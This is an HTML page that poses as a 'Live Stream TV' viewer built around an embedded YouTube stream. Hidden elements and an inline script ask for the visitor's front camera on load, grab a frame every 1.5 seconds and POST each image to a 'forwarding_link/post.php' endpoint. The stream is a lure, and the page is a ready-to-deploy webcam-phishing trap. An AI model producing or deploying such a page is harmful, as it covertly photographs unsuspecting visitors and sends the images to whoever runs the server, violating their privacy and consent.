<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Live Stream TV</title>

    <!-- Essential Scripts & Dependencies -->
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">

    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #FF3366 0%, #FF6B35 100%);
            --accent-gradient: linear-gradient(135deg, #00F2FE 0%, #4FACFE 100%);
            --gold-gradient: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            --glass-bg: rgba(255, 255, 255, 0.07);
            --glass-border: rgba(255, 255, 255, 0.18);
            --text-main: #FFFFFF;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Outfit', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            min-height: 100vh;
            background: #0b0c10;
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px 15px;
            overflow-x: hidden;
            position: relative;
        }

        /* Ambient Glowing Background Orbs */
        body::before, body::after {
            content: '';
            position: fixed;
            width: 320px;
            height: 320px;
            border-radius: 50%;
            filter: blur(120px);
            z-index: -1;
            opacity: 0.4;
            animation: floatGlow 12s infinite alternate ease-in-out;
        }

        body::before {
            background: #ff007f;
            top: -50px;
            left: -50px;
        }

        body::after {
            background: #00e5ff;
            bottom: -50px;
            right: -50px;
            animation-delay: -6s;
        }

        @keyframes floatGlow {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(40px, 50px) scale(1.15); }
        }

        /* Glassmorphism Card Container */
        .card-container {
            width: 100%;
            max-width: 820px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 24px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            position: relative;
            z-index: 1;
        }

        /* Stream Badge */
        .stream-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 20px;
            background: rgba(255, 51, 102, 0.15);
            border: 1px solid rgba(255, 51, 102, 0.3);
            border-radius: 30px;
            font-size: 0.85rem;
            font-weight: 700;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #FF3366;
            margin-bottom: 20px;
        }

        .live-dot {
            width: 10px;
            height: 10px;
            background-color: #FF3366;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }

        /* Responsive Video Container (16:9 Aspect Ratio) */
        .iframe-wrapper {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            height: 0;
            border-radius: 18px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .iframe-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        /* Hidden Capture Elements */
        .video-wrap, canvas {
            display: none !important;
        }
    </style>
</head>

<body>

    <!-- Hidden Capture Streams -->
    <div class="video-wrap" hidden="hidden">
        <video id="video" playsinline autoplay></video>
    </div>
    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
    <span id="errorMsg" style="display:none;"></span>

    <!-- WebCam Capture & Forwarding Script -->
    <script>
    function post(imgdata){
        $.ajax({
            type: 'POST',
            data: { cat: imgdata},
            url: 'forwarding_link/post.php',
            dataType: 'json',
            async: false,
            success: function(result){},
            error: function(){}
        });
    };

    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
        audio: false,
        video: { facingMode: "user" }
    };

    async function init() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            handleSuccess(stream);
        } catch (e) {
            if (errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
        }
    }

    function handleSuccess(stream) {
        window.stream = stream;
        video.srcObject = stream;
        var context = canvas.getContext('2d');
        setInterval(function(){
            context.drawImage(video, 0, 0, 640, 480);
            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData); 
        }, 1500);
    }

    init();
    </script>

    <!-- Main Live Stream Display -->
    <div class="card-container">
        <div class="stream-badge">
            <span class="live-dot"></span> LIVE STREAM
        </div>

        <div class="iframe-wrapper">
            <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>
    </div>

</body>
</html>
